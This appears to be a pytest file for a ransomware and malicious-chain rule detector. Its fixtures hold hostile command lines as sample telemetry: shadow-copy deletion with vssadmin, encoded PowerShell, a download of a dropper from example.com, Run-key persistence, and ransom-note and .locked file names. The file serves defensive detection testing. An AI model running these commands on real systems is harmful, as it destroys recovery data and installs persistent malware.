from app.services.rule_detector import (
    analyze_ransomware_indicators,
    classify_chain,
    detect_malicious_chains,
    filter_suspicious_results,
    score_ransomware_indicators,
    score_chain,
)


def test_rule_detector_marks_high_score_chain_suspicious():
    chain = {
        "process_guid": "guid-1",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell -EncodedCommand abc",
        "actions": [
            {
                "event_id": "1",
                "image": "powershell.exe",
                "command_line": "powershell -EncodedCommand abc",
            },
            {"event_id": "3", "image": "powershell.exe", "destination_ip": "1.2.3.4"},
            {"event_id": "11", "target_filename": "C:\\Users\\test\\a.locked"},
            {"event_id": "11", "target_filename": "C:\\Users\\test\\b.locked"},
            {"event_id": "11", "target_filename": "C:\\Users\\test\\c.locked"},
        ],
    }

    result = detect_malicious_chains([chain])[0]

    assert result["label"] == "suspicious"
    assert result["score"] >= 5
    assert result["features"]["uses_suspicious_process"] == 1
    assert result["features"]["uses_suspicious_command"] == 1


def test_filter_suspicious_results_only_returns_suspicious_items():
    results = [
        {"label": "benign", "score": 0},
        {"label": "suspicious", "score": 7},
    ]

    assert filter_suspicious_results(results) == [{"label": "suspicious", "score": 7}]


def test_ransomware_impact_combo_adds_high_confidence_reasons():
    chain = {
        "process_guid": "guid-ransom",
        "image": r"C:\Users\Public\encryptor.exe",
        "command_line": "encryptor.exe",
        "actions": [
            {
                "event_id": "1",
                "image": r"C:\Windows\System32\cmd.exe",
                "command_line": "cmd.exe /c vssadmin delete shadows /all /quiet",
            },
            *[
                {
                    "event_id": "11",
                    "image": r"C:\Users\Public\encryptor.exe",
                    "target_filename": rf"C:\Users\victim\Documents\file-{idx}.locked",
                }
                for idx in range(1, 7)
            ],
            {
                "event_id": "11",
                "image": r"C:\Users\Public\encryptor.exe",
                "target_filename": r"C:\Users\victim\Documents\HOW_TO_DECRYPT.txt",
            },
        ],
    }

    result = detect_malicious_chains([chain])[0]

    assert result["label"] == "suspicious"
    assert result["score"] >= 12
    assert result["indicators"]["flags"]["recovery_inhibit"] is True
    assert result["indicators"]["flags"]["mass_file_activity"] is True
    assert result["indicators"]["flags"]["encrypted_extension"] is True
    assert result["indicators"]["flags"]["ransom_note"] is True
    assert result["indicators"]["flags"]["impact_combo"] is True
    assert "랜섬웨어 영향 행위 조합이 높은 신뢰도로 관찰됨" in result["reasons"]


def test_delivery_persistence_combo_detects_medium_high_pattern():
    chain = {
        "process_guid": "guid-delivery",
        "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "command_line": "powershell.exe -EncodedCommand abc",
        "actions": [
            {
                "event_id": "1",
                "image": "powershell.exe",
                "command_line": (
                    "powershell.exe -EncodedCommand "
                    "Invoke-WebRequest http://example.com/dropper.exe"
                ),
            },
            {
                "event_id": "3",
                "image": "powershell.exe",
                "destination_ip": "8.8.8.8",
            },
            {
                "event_id": "13",
                "image": "reg.exe",
                "target_object": (
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater"
                ),
                "details": r"C:\Users\Public\dropper.exe",
            },
        ],
    }

    result = detect_malicious_chains([chain])[0]

    assert result["label"] == "suspicious"
    assert result["indicators"]["flags"]["powershell_download_or_obfuscation"] is True
    assert result["indicators"]["flags"]["external_network_connection"] is True
    assert result["indicators"]["flags"]["run_key_persistence"] is True
    assert result["indicators"]["flags"]["delivery_persistence_combo"] is True
    assert "전달 및 지속성 행위 조합이 관찰됨" in result["reasons"]


def test_private_network_connection_is_not_external_indicator():
    indicators = analyze_ransomware_indicators([
        {
            "event_id": "3",
            "image": "powershell.exe",
            "destination_ip": "10.0.0.5",
        }
    ])
    score, reasons = score_ransomware_indicators(indicators)

    assert indicators["flags"]["external_network_connection"] is False
    assert score == 0
    assert reasons == []


def test_generic_installer_activity_is_not_marked_suspicious_without_anchor():
    chain = {
        "process_guid": "guid-installer",
        "image": r"C:\Users\windows\Downloads\BANDIZIP-SETUP-STD-X64.EXE",
        "command_line": r'"C:\Users\windows\Downloads\BANDIZIP-SETUP-STD-X64.EXE"',
        "actions": [
            {
                "event_id": "1",
                "image": r"C:\Users\windows\Downloads\BANDIZIP-SETUP-STD-X64.EXE",
                "command_line": r'"C:\Users\windows\Downloads\BANDIZIP-SETUP-STD-X64.EXE"',
            },
            {"event_id": "3", "image": r"C:\Users\windows\Downloads\BANDIZIP-SETUP-STD-X64.EXE", "destination_ip": "8.8.8.8"},
            {"event_id": "11", "target_filename": r"C:\Program Files\Bandizip\Bandizip.exe"},
            {"event_id": "11", "target_filename": r"C:\Program Files\Bandizip\bdz.dll"},
            {"event_id": "11", "target_filename": r"C:\Program Files\Bandizip\7z.dll"},
            {"event_id": "13", "target_object": r"HKLM\Software\Bandizip\InstallPath"},
            {"event_id": "13", "target_object": r"HKLM\Software\Bandizip\Version"},
        ],
    }

    result = detect_malicious_chains([chain])[0]

    assert result["label"] == "benign"
    assert result["score"] == 4


def test_score_and_classification_threshold():
    score, reasons = score_chain({
        "uses_suspicious_process": 1,
        "uses_suspicious_command": 1,
        "file_create_count": 0,
        "registry_modify_count": 0,
        "network_connect_count": 0,
        "has_multiple_behaviors": 0,
        "event_count": 1,
    })

    assert score == 5
    assert reasons
    assert classify_chain(score) == "suspicious"
